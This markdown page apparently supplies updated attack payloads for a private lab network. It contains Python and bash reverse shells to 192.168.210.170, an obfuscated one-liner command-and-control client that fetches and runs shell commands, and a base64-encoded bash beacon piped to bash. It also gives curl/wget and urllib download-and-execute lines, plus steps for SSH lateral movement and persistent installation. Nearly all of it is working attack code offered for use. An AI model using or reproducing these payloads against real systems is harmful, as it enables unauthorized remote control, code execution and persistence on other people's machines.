# Malformed Labs - Updated Payloads for 192.168.210.0/24 Network

## 🎯 **Your Original Reverse Shell Updated for Lab Network**

### **Direct Reverse Shell (Port 1337)**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.210.170",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### **Enhanced Reverse Shell with Error Handling**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.210.170",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

## 🚀 **C2 Client Payloads (HTTP-based for Web Interface)**

### **Python One-liner (Connects to Your C2 Web Interface)**
```python
python3 -c "import urllib.request,json,subprocess,threading,time,platform,os,hashlib;class C: def __init__(s,h,p):s.h,s.p,s.i,s.r=h,p,hashlib.md5(f'{platform.node()}-{platform.system()}'.encode()).hexdigest()[:8],1; def e(s,c): try:r=subprocess.run(c,shell=1,capture_output=1,text=1,timeout=30);return{'success':r.returncode==0,'stdout':r.stdout,'stderr':r.stderr}; except:return{'success':0,'error':'failed'}; def l(s): while s.r: try:req=urllib.request.Request(f'http://{s.h}:{s.p}/api/commands/{s.i}');resp=urllib.request.urlopen(req,timeout=10);data=json.loads(resp.read().decode());[s.e(cmd['command']) and urllib.request.urlopen(urllib.request.Request(f'http://{s.h}:{s.p}/api/results',json.dumps({'client_id':s.i,'command_id':cmd['id'],'result':s.e(cmd['command'])}).encode(),{'Content-Type':'application/json'})) for cmd in data.get('commands',[])] ; except:pass; time.sleep(5);c=C('192.168.210.170',8888);threading.Thread(target=c.l,daemon=1).start();[time.sleep(60) for _ in iter(int,1)]"
```

### **Base64 Encoded Bash Payload**
```bash
echo aD0iMTkyLjE2OC4yMTAuMTcwIjtwPSI4ODg4IjtpPSQoaG9zdG5hbWUpLSQoZGF0ZSArJXMgfCBtZDVzdW0gfCBjdXQgLWMxLTgpCndoaWxlIHRydWU7IGRvCiBjbWRzPSQoY3VybCAtcyBodHRwOi8vJGg6JHAvYXBpL2NvbW1hbmRzLyRpIHwgZ3JlcCAtbyAnImNvbW1hbmQiOiJbXiJdKiInIHwgY3V0IC1kJyInIC1mNCkKIGZvciBjbWQgaW4gJGNtZHM7IGRvCiAgb3V0PSQoZXZhbCAiJGNtZCIgMj4mMSkKICBjdXJsIC1zIC1YIFBPU1QgLUggIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiIgLWQgInsiY2xpZW50X2lkIjoiJGkiLCJyZXN1bHQiOnsic3Rkb3V0IjoiJG91dCJ9fSIgaHR0cDovLyRoOiRwL2FwaS9yZXN1bHRzID4vZGV2L251bGwKIGRvbmUKIHNsZWVwIDUKZG9uZSAm | base64 -d | bash
```

## 📡 **Network Configuration**

- **C2 Server**: `192.168.210.170:8080` (Web Interface)
- **C2 API**: `192.168.210.170:8888` (Client Communication)  
- **Direct Shell**: `192.168.210.170:1337` (Traditional Reverse Shell)
- **Client Network**: `192.168.210.0/24`

## 🎮 **Usage on New Client Machine**

### **Option 1: Direct Reverse Shell (Your Original Style)**
```bash
# Set up listener on C2 server first:
nc -lvp 1337

# Then on target machine:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.210.170",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### **Option 2: C2 Web Interface Client (Recommended)**
```bash
# No listener needed - connects to your web interface automatically
# Execute on target machine:
python3 -c "import urllib.request,json,subprocess,threading,time,platform,os,hashlib;exec(urllib.request.urlopen('http://192.168.210.170:8888/payload').read())"
```

### **Option 3: File-based Deployment**
```bash
# On target machine:
curl -s http://192.168.210.170:8080/static/client_listener.py | python3 - 192.168.210.170 8888

# Or wget:
wget -qO- http://192.168.210.170:8080/static/client_listener.py | python3 - 192.168.210.170 8888
```

## 🔧 **Integration with Your Lab Environment**

Your lab containers can easily connect:
- **endpoint1** (192.168.210.10) → C2 Server (192.168.210.170)
- **endpoint2** (192.168.210.11) → C2 Server (192.168.210.170)  
- **endpoint3** (192.168.210.12) → C2 Server (192.168.210.170)

### **Quick Test from Lab Containers**
```bash
# From any endpoint container:
docker exec linux_endpoint1 python3 -c "import urllib.request;print(urllib.request.urlopen('http://192.168.210.170:8080/health').read())"
```

## 🚨 **Operational Examples**

### **SSH Lateral Movement**
```bash
# Connect to endpoint and deploy payload
ssh user@192.168.210.10 'python3 -c "import urllib.request,json,subprocess,threading,time,platform,os,hashlib;..."'
```

### **Via Existing Shell**
```bash
# If you already have shell access to endpoint
echo 'python3 -c "..."' | bash
```

### **Persistent Installation**
```bash
# Deploy as background service
./deploy.sh -c 192.168.210.170 -P 8888 -s 192.168.210.10
```